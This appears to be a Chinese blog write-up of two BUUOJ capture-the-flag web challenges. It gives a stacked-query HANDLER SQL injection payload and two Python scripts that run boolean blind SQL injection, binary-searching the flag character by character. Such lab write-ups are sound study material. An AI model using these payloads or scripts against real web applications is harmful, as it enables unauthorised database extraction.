+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>联合注入，通过分号;,来进行语句的划分进行执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过</span><br><span class="line">1&#39;;show tables;</span><br><span class="line">来获取table名称</span><br><span class="line">再通过HANDLER 语句来进行内容的查询</span><br><span class="line"></span><br><span class="line">最后构造payload</span><br><span class="line">?inject&#x3D;1%27%3BHANDLER+FlagHere+OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere COLSE;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>有一个输入框，POST传值参数为id，并且传入1和2的回显不同，存在SQL注入</p>
+<p>进行FUZZ</p>
+<img src="https://img-blog.csdnimg.cn/20201105180141277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:67%;">
+
+<p>发现如果是常规的注入的话，那么注释符都被过滤了，那么应该是利用其他方法，并且根据回显的显示，那么应该是bool盲注</p>
+<p>那么我们就需要构造相应的语句</p>
+<h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用中括号()代替空格</span><br><span class="line">SQL中的IF表达式</span><br><span class="line">IF 表达式</span><br><span class="line">IF( expr1 , expr2 , expr3 )</span><br><span class="line">expr1 的值为 TRUE，则返回值为 expr2 </span><br><span class="line">expr1 的值为FALSE，则返回值为 expr3</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以根据expr1的回显来查看是否正确，一次爆破flag</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>需要注意的是这种持续访问是被禁止的，因此需要多次重启程序，并且调整x的取值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;ad3dae78-5d9f-4859-b3f7-8090d2f262b3.node4.buuoj.cn:81&#x2F;&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for x in range(1, 50):</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (</span><br><span class="line">            x, mid)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">        if &#39;Hello&#39; in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(int(mid))</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"># flag&#123;54d5e2df-b68b-4052-a32f-c068ec92fd64&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据方法一的原理，也可以使用异或的方法，用它可以起到代替or的作用。<br>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)<br>但还有一些是没有用异或，用的是if，可if有局限性，在id为数字型时，可以直接 select * from users where id=if(1=1,1,0)，但如果id单引号字符型或双引号字符型，那就必须在if前加or或and。<br>找了一个二分法的脚本，比方法一的脚本更加迅速</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;ad3dae78-5d9f-4859-b3f7-8090d2f262b3.node4.buuoj.cn:81&#x2F;index.php&quot;</span><br><span class="line">payload &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    l &#x3D; 33</span><br><span class="line">    r &#x3D; 130</span><br><span class="line">    mid &#x3D; (l+r) &gt;&gt; 1</span><br><span class="line">    while(l &lt; r):</span><br><span class="line">        payload[&quot;id&quot;] &#x3D; &quot;0^&quot; + \</span><br><span class="line">            &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(</span><br><span class="line">                i, mid)</span><br><span class="line">        html &#x3D; requests.post(url, data&#x3D;payload)</span><br><span class="line">        # print(payload)</span><br><span class="line">        if &quot;Hello&quot; in html.text:</span><br><span class="line">            l &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            r &#x3D; mid</span><br><span class="line">        mid &#x3D; (l+r) &gt;&gt; 1</span><br><span class="line">    if(chr(mid) &#x3D;&#x3D; &quot; &quot;):</span><br><span class="line">        break</span><br><span class="line">    result &#x3D; result + chr(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(&quot;flag: &quot;, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/10/WEB-BUU%E7%AC%AC%E4%B8%80%E9%A1%B5/">http://example.com/2022/11/10/WEB-BUU%E7%AC%AC%E4%B8%80%E9%A1%B5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/10/java%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">java刷题记录</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/01/2022%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2022祥云杯密码学复现</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
